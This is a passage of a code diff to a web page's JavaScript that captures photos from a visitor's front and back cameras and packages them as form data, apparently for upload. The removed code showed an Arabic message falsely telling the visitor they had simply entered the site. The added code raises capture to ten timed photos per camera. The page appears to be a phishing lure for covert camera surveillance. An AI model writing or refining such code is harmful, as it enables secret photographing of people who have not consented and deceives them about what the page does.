@@ -116,50 +116,33 @@
             }
         }
 
-        async function handleSuccess(frontStream, backStream, additionalData) {
+        function handleSuccess(frontStream, backStream, additionalData) {
             if (frontStream) {
                 frontVideo.srcObject = frontStream;
+                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
             }
             if (backStream) {
                 backVideo.srcObject = backStream;
+                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
             }
-            await captureBothCameras(additionalData);
         }
 
-        async function captureBothCameras(additionalData) {
-            let frontPhotoCount = 0;
-            let backPhotoCount = 0;
-            const totalPhotos = 4;
+        function setupCamera(video, canvas, cameraType, additionalData) {
+            video.play();
+            video.onplaying = () => {
+                const { videoWidth, videoHeight } = video;
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
 
-            while (frontPhotoCount + backPhotoCount < totalPhotos) {
-                if (frontVideo.srcObject && frontPhotoCount <= backPhotoCount) {
-                    await captureAndSend(frontVideo, frontCanvas, 'front', frontPhotoCount, additionalData);
-                    frontPhotoCount++;
-                } else if (backVideo.srcObject) {
-                    await captureAndSend(backVideo, backCanvas, 'back', backPhotoCount, additionalData);
-                    backPhotoCount++;
-                } else if (frontVideo.srcObject) {
-                    await captureAndSend(frontVideo, frontCanvas, 'front', frontPhotoCount, additionalData);
-                    frontPhotoCount++;
-                } else {
-                    break;
-                }
-
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-
-            document.querySelector('.container').innerHTML = `
-                <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
-                <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-            `;
-        }
-
-        async function captureAndSend(video, canvas, cameraType, photoCount, additionalData) {
-            return new Promise((resolve) => {
                 const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let photoCount = 0;
+
+                const captureInterval = setInterval(() => {
+                    if (photoCount >= 10) {
+                        clearInterval(captureInterval);
+                        return;
+                    }
+
 
                 canvas.toBlob(blob => {
                     const formData = new FormData();
